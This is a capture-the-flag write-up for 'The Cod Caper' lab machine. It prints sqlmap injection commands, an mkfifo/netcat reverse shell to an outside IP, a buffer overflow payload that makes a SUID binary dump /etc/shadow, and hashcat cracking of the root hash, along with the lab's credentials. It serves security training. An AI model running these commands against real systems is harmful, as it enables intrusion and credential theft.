# CTF Writeup: The Cod Caper

## Overview
This writeup documents the exploitation path for "The Cod Caper" machine. The attack chain begins with a SQL injection to extract user credentials, followed by establishing a stable interactive shell. Finally, privilege escalation is achieved by exploiting a buffer overflow vulnerability in a custom SUID binary, leading to the cracking of the root password.

---

## 1. Initial Access via SQL Injection
The initial enumeration phase revealed a potentially vulnerable web input. To exploit this, the HTTP request was intercepted and saved to a local file named `rootx`. 

We utilized `sqlmap` to automate the testing process. First, we enumerated the available databases using the saved request:
```bash
sqlmap -r rootx --dbs --batch 
```

Once the databases were identified, we targeted the `users` database to extract its contents:
```bash
sqlmap -r rootx -D users --dump --batch
```

The database dump successfully revealed valid login credentials:
* **Username:** `pingudad`
* **Password:** `secretpass`

---

## 2. Gaining a Foothold and Stabilizing the Shell
With a vulnerability confirmed, we executed a reverse shell payload to gain command-line access to the target machine. We used a standard `mkfifo` technique to establish the connection:
```bash
mkfifo /tmp/lol;nc 192.168.152.214 4444 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol 
```

Reverse shells can often be unstable and lack standard terminal features. To fix this, we stabilized the shell by spawning a fully interactive TTY session using Python:
```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

For a more reliable and permanent connection during the post-exploitation phase, we logged in directly via SSH using the `pingu` user account:
```bash
ssh pingu@10.65.155.101  
```

---

## 3. Privilege Escalation: Buffer Overflow
During our local enumeration for privilege escalation vectors, we searched for files with the SUID bit set and found a highly suspicious custom binary:
* **Target SUID File:** `/opt/secret/root`

Testing the binary revealed that it was vulnerable to a buffer overflow. By carefully mapping the memory, we determined that supplying an exact padding of 44 "A" characters followed by a specific memory address (`0x080484cb`, written in little-endian format as `\xcb\x84\x04\x08`) would overwrite the instruction pointer and alter the program's execution flow.

Running our crafted payload forced the SUID binary to output the contents of the highly restricted `/etc/shadow` file:
```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

---

## 4. Hash Cracking and Root Access
From the dumped `/etc/shadow` output, we successfully extracted the SHA-512 crypt hash for the root user. We saved this hash into a local file named `hash.txt`.

To crack the password, we utilized `hashcat` alongside the well-known `rockyou.txt` wordlist. We also appended the `-O` flag to enable optimized kernels for faster cracking performance:
```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt -O
```

The cracking process was successful, revealing the final secret:
* **Root Password:** `love2fish`

Using this password, we can successfully authenticate as root, achieving a full system compromise.